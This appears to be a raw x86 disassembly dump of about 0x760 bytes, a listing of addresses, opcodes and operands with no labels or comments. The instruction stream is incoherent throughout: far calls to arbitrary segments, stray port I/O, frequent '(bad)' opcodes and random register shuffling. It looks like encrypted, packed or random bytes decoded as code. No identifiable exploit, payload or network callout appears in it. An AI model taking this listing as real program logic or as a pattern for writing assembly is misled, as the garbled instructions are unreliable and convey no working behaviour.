  43d501:	jo     0x43d4b1
  43d503:	dec    esp
  43d504:	in     eax,0xf9
  43d506:	call   0x629f:0x6abf4573
  43d50d:	sbb    ch,dh
  43d50f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d510:	lods   al,BYTE PTR ds:[esi]
  43d511:	sar    DWORD PTR [ecx-0x131d9184],cl
  43d517:	jo     0x43d4cb
  43d519:	aas    
  43d51a:	xor    DWORD PTR [edi+0x59f90c8c],eax
  43d520:	add    DWORD PTR [ebx],ecx
  43d522:	push   cs
  43d523:	mov    ds:0xef0cd2ea,eax
  43d528:	dec    edi
  43d529:	cmp    eax,0x127fa69a
  43d52e:	push   0xffffffb9
  43d530:	fdivrp st(2),st
  43d532:	cmp    DWORD PTR [edi+0x14e1546d],esp
  43d538:	push   edi
  43d539:	fsubr  QWORD PTR [esi]
  43d53b:	mov    al,0xb2
  43d53d:	clc    
  43d53e:	fistp  QWORD PTR [edi+esi*2+0x4d]
  43d542:	inc    esp
  43d543:	xchg   edi,eax
  43d544:	inc    eax
  43d545:	adc    eax,0x8a2ba887
  43d54a:	adc    eax,0xdd601efc
  43d54f:	pop    edi
  43d550:	xor    eax,0xee819ac1
  43d555:	lock or BYTE PTR [esi-0x599b8d3d],bl
  43d55c:	pop    esp
  43d55d:	ss sbb al,0xfe
  43d560:	add    al,0xb2
  43d562:	fdiv   QWORD PTR [eax]
  43d564:	je     0x43d58d
  43d566:	call   0x5382:0xaa806096
  43d56d:	jae    0x43d589
  43d56f:	test   al,0xe9
  43d571:	adc    eax,0xf292128e
  43d576:	xchg   DWORD PTR [esp+eax*2],edi
  43d579:	jns    0x43d515
  43d57b:	mov    BYTE PTR [ecx+0x56],cl
  43d57e:	inc    eax
  43d57f:	idiv   DWORD PTR [eax+0xe517b19]
  43d585:	or     edi,DWORD PTR [edi-0x7ed25ea5]
  43d58b:	shr    DWORD PTR [esi+0x66],cl
  43d58e:	xchg   dh,ch
  43d590:	sbb    al,0x2a
  43d592:	pop    edx
  43d593:	or     eax,0xdb4b65f5
  43d598:	dec    ebp
  43d599:	or     esi,DWORD PTR [ecx+0x6e7637a2]
  43d59f:	adc    DWORD PTR [ebp-0x67],edi
  43d5a2:	call   0x1ab7:0xb759fe7e
  43d5a9:	sub    DWORD PTR [ebp+0x3461f3a7],edx
  43d5af:	mov    ebp,0xe0d1eec0
  43d5b4:	mov    BYTE PTR [ebx-0x35],dh
  43d5b7:	daa    
  43d5b8:	fstp   st(2)
  43d5ba:	(bad)
  43d5bd:	sbb    eax,0xa5d4a7ec
  43d5c2:	jecxz  0x43d5a7
  43d5c4:	and    eax,0xb228368e
  43d5c9:	aad    0x9d
  43d5cb:	test   eax,0xad9751d8
  43d5d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d5d1:	or     bh,BYTE PTR [ebp-0x1]
  43d5d4:	jmp    0x9778352
  43d5d9:	cmp    dl,BYTE PTR [eax+0x73]
  43d5dc:	stc    
  43d5dd:	mov    bl,0x9b
  43d5df:	ins    BYTE PTR es:[edi],dx
  43d5e0:	cs gs ss popa 
  43d5e4:	outs   dx,DWORD PTR ds:[esi]
  43d5e5:	jne    0x43d5a1
  43d5e7:	ins    DWORD PTR es:[edi],dx
  43d5e8:	popa   
  43d5e9:	or     edi,DWORD PTR [ebp+0x39]
  43d5ec:	mov    esi,0xd1910fab
  43d5f1:	mov    bh,0x9d
  43d5f3:	stos   BYTE PTR es:[edi],al
  43d5f4:	in     eax,0xb0
  43d5f6:	lock pop ss
  43d5f8:	xchg   edx,eax
  43d5f9:	mov    edx,esi
  43d5fb:	imul   edi,DWORD PTR [ebx],0x64725f0b
  43d601:	cmp    al,0x48
  43d603:	call   0xb9e27b72
  43d608:	adc    eax,DWORD PTR [ebx+0xf]
  43d60b:	jle    0x43d682
  43d60d:	sbb    DWORD PTR [edx+0x73746786],0x7d7c9551
  43d617:	fldcw  WORD PTR [eax+0xb]
  43d61a:	push   esi
  43d61b:	fwait
  43d61c:	rcr    DWORD PTR [esp+eax*1],1
  43d61f:	xor    eax,esp
  43d621:	jmp    0x1dd3:0xfb753e9a
  43d628:	jb     0x43d5bb
  43d62a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d62b:	inc    ebp
  43d62c:	fwait
  43d62d:	or     edx,ecx
  43d62f:	add    al,BYTE PTR [esi+0x51]
  43d632:	daa    
  43d633:	jo     0x43d69f
  43d635:	fistp  DWORD PTR [edx-0x11f825af]
  43d63b:	inc    ebp
  43d63c:	sub    ch,bl
  43d63e:	jmp    0x3a5ea4ea
  43d643:	xchg   esi,eax
  43d644:	jle    0x43d5ea
  43d646:	ret    0x8a9a
  43d649:	xor    edi,DWORD PTR [edi+0x28]
  43d64c:	adc    bh,bh
  43d64e:	and    eax,edi
  43d650:	repnz push edi
  43d652:	adc    al,ah
  43d654:	xor    ah,BYTE PTR fs:[esi-0xb]
  43d658:	xor    ebp,DWORD PTR [esi+0x3329e936]
  43d65e:	lods   al,BYTE PTR ds:[esi]
  43d65f:	imul   edi,DWORD PTR [edi-0x5c],0xffffff9d
  43d663:	or     eax,0x1c8f4b5d
  43d668:	ret    0x5a42
  43d66b:	aad    0xfc
  43d66d:	or     esi,DWORD PTR [ebp-0x4de7e3e9]
  43d673:	pop    esi
  43d674:	pop    edi
  43d675:	js     0x43d611
  43d677:	adc    bl,BYTE PTR [esi+edx*2+0x7d]
  43d67b:	lods   eax,DWORD PTR ds:[esi]
  43d67c:	jo     0x43d6de
  43d67e:	adc    DWORD PTR [edi-0x43df43d4],esp
  43d684:	xchg   DWORD PTR [edi+0x21b5771d],edi
  43d68a:	or     ebp,DWORD PTR [eax-0x56]
  43d68d:	popa   
  43d68e:	mov    ch,BYTE PTR [esi+eiz*8+0x26a60530]
  43d695:	add    edx,edi
  43d697:	pop    edx
  43d698:	xchg   edi,eax
  43d699:	sbb    BYTE PTR [edi+eax*2-0x7a],0xe
  43d69e:	test   bl,ch
  43d6a0:	pop    esp
  43d6a1:	repnz add eax,0x9a1bdecd
  43d6a7:	xor    eax,0xc993a10c
  43d6ac:	sub    al,0xe9
  43d6ae:	shl    DWORD PTR [eax+0x1e8e1c38],0xa
  43d6b5:	sti    
  43d6b6:	xchg   dh,ch
  43d6b8:	repz sbb eax,0x8f4c2f9b
  43d6be:	sub    eax,0xea676825
  43d6c3:	mov    ds:0xd0b40ba2,eax
  43d6c8:	inc    esi
  43d6c9:	aas    
  43d6ca:	pop    esp
  43d6cb:	sub    eax,0xe4ed5049
  43d6d0:	mov    dl,0xb1
  43d6d2:	jg     0x43d6c1
  43d6d4:	fld    DWORD PTR [edi]
  43d6d6:	cld    
  43d6d7:	push   ebp
  43d6d8:	pop    es
  43d6d9:	jle    0x43d6e6
  43d6db:	aas    
  43d6dc:	dec    ebx
  43d6dd:	jno    0x43d68c
  43d6df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d6e0:	add    al,0x52
  43d6e2:	mov    WORD PTR [ebp-0x3d7e5dbc],?
  43d6e8:	mov    dl,0x9e
  43d6ea:	aad    0x6
  43d6ec:	cdq    
  43d6ed:	mov    cl,0x6d
  43d6ef:	and    eax,0xd08a093f
  43d6f4:	and    edi,DWORD PTR [edx+edx*2]
  43d6f7:	leave  
  43d6f8:	shr    cl,cl
  43d6fa:	popa   
  43d6fb:	sub    al,0xb3
  43d6fd:	cmp    BYTE PTR [edx],bh
  43d6ff:	pop    esi
  43d700:	into   
  43d701:	pop    es
  43d702:	fsub   st,st(7)
  43d704:	inc    esi
  43d705:	jns    0x43d6d4
  43d707:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d708:	pushf  
  43d709:	dec    eax
  43d70a:	lock lds ecx,FWORD PTR [eax]
  43d70d:	int    0x16
  43d70f:	out    0x27,eax
  43d711:	push   eax
  43d712:	(bad)  
  43d713:	imul   esi,DWORD PTR [edx-0x7a0b05ff],0x5a
  43d71a:	mov    esi,0x660b7d16
  43d71f:	pop    ecx
  43d720:	mov    bh,0x18
  43d722:	in     al,0xf3
  43d724:	sbb    BYTE PTR [edx+ebx*4+0x2e69186b],0xb8
  43d72c:	mov    edx,0xe0a7c5ed
  43d731:	dec    ebp
  43d732:	div    DWORD PTR [edi-0x4010ac14]
  43d738:	enter  0x9afe,0x4b
  43d73c:	emms   
  43d73e:	and    DWORD PTR [edx],eax
  43d740:	cmp    DWORD PTR [edx+0x6c],ebx
  43d743:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d744:	sbb    cl,dh
  43d746:	aaa    
  43d747:	je     0x43d707
  43d749:	pop    ecx
  43d74a:	fwait
  43d74b:	mov    al,0xb2
  43d74d:	in     eax,0x68
  43d74f:	jmp    0x13115d74
  43d754:	sbb    ecx,DWORD PTR [ebx]
  43d756:	stos   BYTE PTR es:[edi],al
  43d757:	imul   edi,DWORD PTR [ebp+0x2b],0xb7c22b71
  43d75e:	xchg   ebx,eax
  43d760:	push   esi
  43d761:	retf   
  43d762:	fisub  DWORD PTR [edi]
  43d764:	fisub  DWORD PTR [esi+0x3]
  43d767:	ficomp DWORD PTR [ebx+0xb]
  43d76a:	or     BYTE PTR [ebx],dl
  43d76c:	and    ah,BYTE PTR [edi-0x69]
  43d76f:	dec    eax
  43d770:	in     al,dx
  43d771:	xchg   edi,eax
  43d772:	add    ah,BYTE PTR [edx+esi*4+0x2facd50c]
  43d779:	xchg   BYTE PTR [esi+0x2],ah
  43d77c:	out    0xb,eax
  43d77e:	adc    al,0x74
  43d780:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d781:	(bad)  
  43d783:	fidiv  WORD PTR ds:0xc9b29a11
  43d789:	push   0xffffffa8
  43d78b:	sub    bh,BYTE PTR [eax]
  43d78d:	repz add al,0xa7
  43d790:	call   0xd8a4:0x3e0a85fe
  43d797:	sti    
  43d798:	ret    
  43d799:	rcr    BYTE PTR [eax-0x359be177],1
  43d79f:	mov    ds:0xbf9a546c,al
  43d7a4:	mov    es,WORD PTR [eax+0x46b21d66]
  43d7aa:	outs   dx,DWORD PTR ds:[esi]
  43d7ab:	test   BYTE PTR [esp+eax*4+0xbf4953b],bl
  43d7b2:	push   esi
  43d7b3:	(bad)  
  43d7b4:	fucomp st(5)
  43d7b6:	lods   eax,DWORD PTR ds:[esi]
  43d7b7:	xchg   bp,ax
  43d7b9:	sbb    BYTE PTR [edx+0x7ad34fad],0xa0
  43d7c0:	inc    ecx
  43d7c1:	inc    esi
  43d7c2:	lods   al,BYTE PTR ds:[esi]
  43d7c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d7c4:	xor    esi,DWORD PTR [ebx+eiz*4]
  43d7c7:	push   ebp
  43d7c8:	daa    
  43d7c9:	lahf   
  43d7ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d7cb:	add    al,0x5c
  43d7cd:	loopne 0x43d769
  43d7cf:	vpsubsw ymm4,ymm5,YMMWORD PTR [eax+edx*1+0x1c]
  43d7d5:	out    0xc7,eax
  43d7d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d7d8:	arpl   WORD PTR [edi+0x714e9d87],bp
  43d7de:	lock pop eax
  43d7e0:	mov    dl,0x1b
  43d7e2:	cmp    BYTE PTR [ebx],bh
  43d7e4:	sub    ah,cl
  43d7e6:	out    0xac,eax
  43d7e8:	(bad)  
  43d7e9:	or     eax,eax
  43d7eb:	and    BYTE PTR [ecx-0x54281a7b],ch
  43d7f1:	fwait
  43d7f2:	call   0x8fdf:0xdfae9f0d
  43d7f9:	adc    esi,edx
  43d7fb:	dec    edi
  43d7fc:	inc    esi
  43d7fd:	or     al,0x79
  43d7ff:	xor    al,BYTE PTR [ebx]
  43d801:	push   cs
  43d802:	xchg   edx,eax
  43d803:	xchg   DWORD PTR [ecx+eax*8+0x52],edi
  43d807:	sbb    dh,BYTE PTR [edx-0x4a233d6c]
  43d80d:	repz push edi
  43d80f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d810:	sbb    al,0x76
  43d812:	pop    ebp
  43d813:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d814:	imul   edx
  43d816:	inc    edx
  43d817:	push   edx
  43d818:	add    DWORD PTR [ebx-0x4],0xd05ab2ea
  43d81f:	fiadd  WORD PTR [ecx+0xa]
  43d822:	jbe    0x43d854
  43d824:	pop    esp
  43d825:	or     edx,DWORD PTR [esi-0x3b85b451]
  43d82b:	and    BYTE PTR [ebx-0x2a],dh
  43d82e:	popf   
  43d82f:	jbe    0x43d833
  43d831:	fdivr  st(7),st
  43d833:	pop    ebp
  43d834:	add    al,BYTE PTR ds:0x7d7afba3
  43d83a:	(bad)  
  43d83b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d83c:	jmp    DWORD PTR [ebp+0x512439]
  43d842:	fs popa 
  43d844:	mov    dl,0xc9
  43d846:	scas   al,BYTE PTR es:[edi]
  43d847:	xchg   edi,eax
  43d848:	enter  0x4b7c,0x8a
  43d84c:	push   cs
  43d84d:	or     ecx,ecx
  43d84f:	cmp    ebp,DWORD PTR [edi-0x1f]
  43d852:	jecxz  0x43d89a
  43d854:	push   edi
  43d855:	(bad)  
  43d856:	call   0xed35:0xcebfea16
  43d85d:	sub    al,dh
  43d85f:	inc    ebx
  43d860:	popf   
  43d861:	sbb    al,0x94
  43d863:	add    DWORD PTR [edi],ecx
  43d865:	adc    eax,0x4b88f8ee
  43d86a:	add    ah,BYTE PTR [esi-0x26]
  43d86d:	pop    edi
  43d86e:	mov    ds:0xd696b225,al
  43d873:	mov    ah,0xc
  43d875:	enter  0xe329,0x26
  43d879:	or     edi,DWORD PTR [eax-0x285f4f90]
  43d87f:	retf   0xb980
  43d882:	call   0xae44:0x76effef7
  43d889:	aad    0x42
  43d88b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d88c:	xor    ch,BYTE PTR [edi+edi*4-0x2cc9a5c4]
  43d893:	or     al,0xae
  43d895:	cmp    DWORD PTR [edi-0x50],eax
  43d898:	jb     0x43d8af
  43d89a:	mov    al,dh
  43d89c:	sub    esp,DWORD PTR [edi-0x552b5895]
  43d8a2:	xrelease mov BYTE PTR [ebx-0x40],cl
  43d8a6:	sub    eax,0x149bb2db
  43d8ab:	fsub   st(6),st
  43d8ad:	sar    ebp,1
  43d8af:	jno    0x43d86c
  43d8b1:	jae    0x43d864
  43d8b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d8b4:	aam    0xd5
  43d8b6:	sbb    DWORD PTR [esi],eax
  43d8b8:	pop    ebx
  43d8b9:	xor    BYTE PTR [edx-0x16],cl
  43d8bc:	inc    edx
  43d8bd:	fstp   DWORD PTR [edx+0x6996fb0b]
  43d8c3:	mov    ebx,edx
  43d8c5:	dec    ecx
  43d8c6:	out    dx,eax
  43d8c7:	lods   al,BYTE PTR ds:[esi]
  43d8c8:	adc    al,0xcf
  43d8ca:	sahf   
  43d8cb:	div    BYTE PTR [ebp-0x3f76368e]
  43d8d1:	adc    al,0x2c
  43d8d3:	jnp    0x43d89e
  43d8d5:	mov    esi,DWORD PTR [ebx]
  43d8d7:	pop    edi
  43d8d8:	push   eax
  43d8d9:	neg    DWORD PTR [edi]
  43d8db:	mov    ebp,0x474838b2
  43d8e0:	push   ds
  43d8e1:	mov    edx,0x1dee1f92
  43d8e6:	jg     0x43d955
  43d8e8:	xor    eax,0x75f04c0b
  43d8ed:	dec    edi
  43d8ee:	jne    0x43d8d1
  43d8f0:	mov    dl,0x47
  43d8f2:	imul   eax,esp,0xbf038737
  43d8f8:	push   ebx
  43d8f9:	xchg   esp,eax
  43d8fa:	dec    edx
  43d8fb:	outs   dx,BYTE PTR ds:[esi]
  43d8fc:	mov    ebp,0x7e64868b
  43d901:	mov    edx,DWORD PTR [edi-0x6030b399]
  43d907:	xlat   BYTE PTR ds:[ebx]
  43d908:	inc    ebx
  43d909:	or     BYTE PTR [ecx+0x70685099],bh
  43d90f:	into   
  43d910:	push   edx
  43d911:	jbe    0x43d8f3
  43d913:	scas   eax,DWORD PTR es:[edi]
  43d914:	mov    dl,0x78
  43d916:	or     bh,dl
  43d918:	lahf   
  43d919:	dec    ecx
  43d91a:	pop    ecx
  43d91b:	push   ebp
  43d91c:	cmc    
  43d91d:	or     esp,DWORD PTR [edx-0x44]
  43d920:	add    ah,dh
  43d922:	sub    BYTE PTR [ebx-0x5566638d],al
  43d928:	out    dx,eax
  43d929:	ret    
  43d92a:	mov    bl,0x43
  43d92c:	cld    
  43d92d:	ret    
  43d92e:	sub    al,0x69
  43d930:	std    
  43d931:	xor    eax,0xdcb22a0a
  43d936:	fcom   DWORD PTR [edi+ebx*2-0x49]
  43d93a:	inc    eax
  43d93b:	mov    edx,0x642f99b5
  43d940:	xchg   ebx,eax
  43d941:	std    
  43d942:	cmp    bh,cl
  43d944:	aad    0x25
  43d946:	lahf   
  43d947:	mov    edx,0xa71d683b
  43d94c:	push   esi
  43d94d:	call   0xa9d0b01f
  43d952:	call   0x647e:0x908b087f
  43d959:	xchg   ebp,eax
  43d95a:	test   BYTE PTR [edi+0x57ee61ba],ah
  43d960:	mul    eax
  43d962:	pusha  
  43d963:	mov    eax,0xaa8fa0b2
  43d968:	xor    DWORD PTR [eax],edx
  43d96a:	dec    eax
  43d96b:	out    0xdb,eax
  43d96d:	or     DWORD PTR [esi+0x50ffd1f],eax
  43d973:	bound  esi,QWORD PTR [edx-0x48]
  43d976:	mov    ss,WORD PTR [esp+ecx*4-0x7a]
  43d97a:	cdq    
  43d97b:	cmp    DWORD PTR [esi-0xb],ebx
  43d97e:	aam    0x8a
  43d980:	push   esi
  43d981:	jmp    0x43d937
  43d983:	pop    ebx
  43d984:	mov    DWORD PTR [edx-0x76],ebx
  43d987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d988:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d989:	aad    0x57
  43d98b:	fdiv   QWORD PTR [eax+0xa]
  43d98e:	(bad)  
  43d98f:	xor    al,0xb6
  43d991:	jle    0x43d9a7
  43d993:	adc    ch,BYTE PTR [esi-0x74]
  43d996:	sbb    eax,0x24969798
  43d99b:	cmp    BYTE PTR [bx+si+0x47e],dl
  43d9a0:	mov    dl,0x6b
  43d9a2:	and    al,0x7d
  43d9a4:	jae    0x43da0d
  43d9a6:	xchg   esp,eax
  43d9a7:	push   ds
  43d9a8:	enter  0x6e16,0x13
  43d9ac:	test   BYTE PTR [ebx-0x1f0b2c35],cl
  43d9b2:	stos   DWORD PTR es:[edi],eax
  43d9b3:	repnz mov bl,0xd
  43d9b6:	cmp    al,0xda
  43d9b8:	aaa    
  43d9b9:	pop    eax
  43d9ba:	aam    0x5a
  43d9bc:	push   0xffffff90
  43d9be:	enter  0xb9a7,0x54
  43d9c2:	and    edx,edx
  43d9c4:	(bad)
  43d9c8:	mov    dl,0x22
  43d9ca:	ret    
  43d9cb:	sbb    BYTE PTR [ecx],0x78
  43d9ce:	add    BYTE PTR ds:0x6ce0bc5,dh
  43d9d4:	pushf  
  43d9d5:	cld    
  43d9d6:	adc    eax,0x9a26166d
  43d9db:	jo     0x43da41
  43d9dd:	adc    DWORD PTR [esi-0x512a7a4b],ebx
  43d9e3:	aad    0x5a
  43d9e5:	jp     0x43d992
  43d9e7:	push   ebp
  43d9e8:	cld    
  43d9e9:	or     ebx,ebx
  43d9eb:	cmp    ecx,DWORD PTR [edx-0x2a]
  43d9ee:	sub    esi,DWORD PTR [esi]
  43d9f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d9f1:	xor    al,0x85
  43d9f3:	aas    
  43d9f4:	stos   BYTE PTR es:[edi],al
  43d9f5:	out    dx,al
  43d9f6:	pop    edx
  43d9f7:	ret    
  43d9f8:	mov    al,0xe2
  43d9fa:	mov    dl,0xfd
  43d9fc:	jb     0x43d9e9
  43d9fe:	js     0x43d9a7
  43da00:	es jne 0x43da7d
  43da03:	fcomp  QWORD PTR [ecx-0x14]
  43da06:	xchg   edi,eax
  43da07:	push   ss
  43da08:	mov    dl,0x86
  43da0a:	cmp    al,0xe0
  43da0c:	mov    ch,BYTE PTR [ebx+0xb099d7b]
  43da12:	pop    ds
  43da13:	(bad)  
  43da14:	mov    al,es:0xd611816d
  43da1a:	call   0xdeab:0x542c34fe
  43da21:	ror    DWORD PTR [eax-0x5c68675e],1
  43da27:	jbe    0x43d9c7
  43da29:	or     ebx,DWORD PTR [ebx]
  43da2b:	pop    edi
  43da2c:	repz aam 0x98
  43da2f:	inc    ebx
  43da30:	mov    bl,0xfd
  43da32:	fwait
  43da33:	sub    esp,DWORD PTR [edx-0x6d75e578]
  43da39:	push   ss
  43da3a:	and    eax,0xd834deae
  43da3f:	push   edi
  43da40:	xor    ch,BYTE PTR [eax]
  43da42:	pop    ss
  43da43:	retw   
  43da45:	ret    
  43da46:	je     0x43dab2
  43da48:	inc    esp
  43da49:	fs fwait
  43da4b:	mov    esp,0xea190c35
  43da50:	lock outs dx,BYTE PTR ds:[esi]
  43da52:	mov    al,0x47
  43da54:	add    dh,BYTE PTR [ecx-0x66]
  43da57:	imul   ebp,ecx,0x14
  43da5a:	mov    ah,0xcf
  43da5c:	xchg   edi,eax
  43da5d:	xchg   al,dh
  43da5f:	mov    ebx,0x679be916
  43da64:	sub    esi,edi
  43da66:	jmp    DWORD PTR [ebx]
  43da68:	div    BYTE PTR [ecx-0x4332a266]
  43da6e:	ins    BYTE PTR es:[edi],dx
  43da6f:	jb     0x43da2c
  43da71:	jp     0x43daef
  43da73:	dec    ebp
  43da74:	call   0x8c894f84
  43da79:	xor    BYTE PTR [ebp-0x65c5050c],ch
  43da7f:	xor    edx,DWORD PTR [ecx-0x2f7b1f2]
  43da85:	arpl   si,bx
  43da87:	popf   
  43da88:	int3   
  43da89:	sub    bl,BYTE PTR [ecx-0x6f1f2982]
  43da8f:	xor    BYTE PTR [edx-0x63],cl
  43da92:	jns    0x43da50
  43da94:	mov    bh,0x50
  43da96:	inc    ebp
  43da97:	arpl   sp,dx
  43da99:	inc    edx
  43da9a:	pop    edx
  43da9b:	xchg   DWORD PTR [ebp+0x56a7b2b2],eax
  43daa1:	(bad)  
  43daa2:	es jg  0x43da7e
  43daa5:	in     eax,dx
  43daa6:	or     al,0xa6
  43daa8:	scas   eax,DWORD PTR es:[edi]
  43daa9:	inc    ebp
  43daaa:	ss pop esi
  43daac:	jb     0x43dad5
  43daae:	add    ebp,DWORD PTR [ebx]
  43dab0:	out    0x5a,al
  43dab2:	xor    al,0xa7
  43dab4:	sti    
  43dab5:	mov    ah,0xbe
  43dab7:	rol    BYTE PTR [edx-0x15560414],0x7c
  43dabe:	cmc    
  43dabf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43dac0:	pop    ss
  43dac1:	lods   al,BYTE PTR ds:[esi]
  43dac2:	fnstsw WORD PTR [ebx]
  43dac4:	sbb    eax,0x89a6c001
  43dac9:	(bad)  
  43daca:	xor    al,0x7
  43dacc:	test   al,0xce
  43dace:	mov    ds:0x9ae8a54f,al
  43dad3:	clc    
  43dad4:	in     eax,0x2b
  43dad6:	cld    
  43dad7:	mov    dl,0x38
  43dad9:	fwait
  43dada:	mov    al,ds:0xd6f705a7
  43dadf:	les    edi,FWORD PTR [ecx-0x50cdd3c0]
  43dae5:	push   0x68
  43dae7:	in     al,0x72
  43dae9:	lds    edx,FWORD PTR [edx-0x5b69b617]
  43daef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43daf0:	lods   eax,DWORD PTR ds:[esi]
  43daf1:	(bad)  
  43daf2:	aad    0x33
  43daf4:	pop    ds
  43daf5:	mov    dh,0x64
  43daf7:	ja     0x43da86
  43daf9:	out    dx,al
  43dafa:	call   0xc892:0x9f88beba
  43db01:	or     dl,cl
  43db03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43db04:	adc    dh,BYTE PTR [esi+ecx*8+0x1e]
  43db08:	adc    ch,cl
  43db0a:	stos   BYTE PTR es:[edi],al
  43db0b:	pop    esp
  43db0c:	xchg   esi,eax
  43db0d:	test   DWORD PTR [esi-0x4c],esi
  43db10:	mov    cl,0x73
  43db12:	sub    eax,0xa6aab6fa
  43db17:	loope  0x43db5b
  43db19:	inc    ebx
  43db1a:	scas   al,BYTE PTR es:[edi]
  43db1b:	popf   
  43db1c:	mov    ds:0x23531af1,eax
  43db21:	sub    eax,0x4eb90825
  43db26:	lahf   
  43db27:	push   esi
  43db28:	lahf   
  43db29:	sub    edi,eax
  43db2b:	in     eax,0x72
  43db2d:	dec    ebp
  43db2e:	push   eax
  43db2f:	stc    
  43db30:	mov    eax,ds:0x3315d214
  43db35:	mov    WORD PTR [edx],gs
  43db37:	sub    DWORD PTR [ebx+ecx*4-0x40],ebp
  43db3b:	iret   
  43db3c:	test   al,0x2f
  43db3e:	call   0x6188:0x161ff938
  43db45:	dec    ebp
  43db46:	out    dx,eax
  43db47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43db48:	push   ecx
  43db49:	jmp    0x43db53
  43db4b:	ja     0x43db11
  43db4d:	cmp    DWORD PTR [edx+0x75],0x78
  43db51:	sub    DWORD PTR [ebp-0x1b015320],edx
  43db57:	mov    BYTE PTR [esi+0x42719d0a],ah
  43db5d:	add    DWORD PTR [edi-0x22],edi
  43db60:	rol    BYTE PTR [esi-0x5d],cl
  43db63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43db64:	or     dh,ah
  43db66:	mov    ch,0x3c
  43db68:	jb     0x43daf3
  43db6a:	cli    
  43db6b:	mov    esp,0x979a0451
  43db70:	push   eax
  43db71:	jl     0x43db4f
  43db73:	shr    DWORD PTR [eax-0x68589252],0xa6
  43db7a:	cmp    al,0x8
  43db7c:	mov    DWORD PTR [esi+0x7bb24064],ebx
  43db82:	pop    esi
  43db83:	xor    dl,bh
  43db85:	loopne 0x43dbf0
  43db87:	out    0x42,eax
  43db89:	cmp    edx,DWORD PTR [eax+0x7a]
  43db8c:	xor    al,0x8c
  43db8e:	xchg   edx,eax
  43db8f:	mov    dh,0xb2
  43db91:	cmp    eax,0x9461093e
  43db96:	and    ebx,edi
  43db98:	test   BYTE PTR [eax+ebx*1],0x49
  43db9c:	push   ds
  43db9d:	xchg   ebx,eax
  43db9e:	cs xchg edi,eax
  43dba0:	out    0x8e,eax
  43dba2:	inc    edx
  43dba3:	xor    eax,0xd7d1d2b2
  43dba8:	or     al,0xc2
  43dbaa:	inc    esp
  43dbab:	in     al,0x3a
  43dbad:	or     edi,DWORD PTR [ecx-0x74]
  43dbb0:	dec    eax
  43dbb1:	ds mov bl,0x1d
  43dbb4:	xor    eax,0x84b09a1f
  43dbb9:	jle    0x43db96
  43dbbb:	aad    0x81
  43dbbd:	int3   
  43dbbe:	xchg   edi,eax
  43dbbf:	fdiv   st(3),st
  43dbc1:	or     ah,ch
  43dbc3:	jno    0x43dbf2
  43dbc5:	loope  0x43dba6
  43dbc7:	aam    0xd6
  43dbc9:	out    0xb3,eax
  43dbcb:	bound  esi,QWORD PTR [edx-0x6beb052e]
  43dbd1:	sbb    DWORD PTR [ecx+0x710b55dd],esi
  43dbd7:	lahf   
  43dbd8:	(bad)  
  43dbd9:	(bad)  
  43dbdb:	inc    ebp
  43dbdc:	or     DWORD PTR [edx],ecx
  43dbde:	call   0x444d:0xfb16dc3e
  43dbe5:	retf   0xa756
  43dbe8:	xor    al,0xf7
  43dbea:	cli    
  43dbeb:	push   ebp
  43dbec:	jns    0x43dbfa
  43dbee:	jae    0x43db8d
  43dbf0:	mov    ch,0xd9
  43dbf2:	test   DWORD PTR [ebx-0x66d25ed7],esi
  43dbf8:	mov    ds:0x4609e3d4,al
  43dbfd:	or     ecx,DWORD PTR [edx-0x53]
  43dc00:	(bad)  
  43dc01:	lods   al,BYTE PTR ds:[esi]
  43dc02:	lds    esi,FWORD PTR [eax-0x70]
  43dc05:	dec    ebx
  43dc06:	mov    DWORD PTR [ecx],ebp
  43dc08:	outs   dx,BYTE PTR ds:[esi]
  43dc09:	lock call 0xc474:0x5e2cdf56
  43dc11:	or     al,0x9e
  43dc13:	jge    0x43dc7b
  43dc15:	fimul  DWORD PTR [ecx]
  43dc17:	pop    ss
  43dc18:	and    al,0x4
  43dc1a:	loopne 0x43dc30
  43dc1c:	mov    ch,0x3d
  43dc1e:	cli    
  43dc1f:	sbb    ch,BYTE PTR [edi]
  43dc21:	xchg   esp,eax
  43dc22:	cmp    bl,BYTE PTR [edi]
  43dc24:	aad    0x68
  43dc26:	into   
  43dc27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43dc28:	lahf   
  43dc29:	cmp    ch,BYTE PTR [edi+0x6d496271]
  43dc2f:	cmp    ebp,esi
  43dc31:	mov    BYTE PTR [edi-0x26],dl
  43dc34:	mov    esp,0xde9fdf90
  43dc39:	or     eax,DWORD PTR [ebx+eiz*1-0x580eed9b]
  43dc40:	call   0x7b3d9419
  43dc45:	mov    bh,0xbf
  43dc47:	mov    BYTE PTR [ebx-0x2a4546ad],dh
  43dc4d:	(bad)  
  43dc4e:	in     al,dx
  43dc4f:	fist   DWORD PTR [edx-0x5d]
  43dc52:	jne    0x43dc25
  43dc54:	jb     0x43dc5e
  43dc56:	mov    al,0xcd
  43dc58:	shr    bh,cl
  43dc5a:	nop
  43dc5b:	outs   dx,DWORD PTR ds:[esi]
  43dc5c:	cmp    dh,al
  43dc5e:	in     eax,dx
  43dc5f:	leave  
  43dc60:	mov    ebp,0x752cd57e
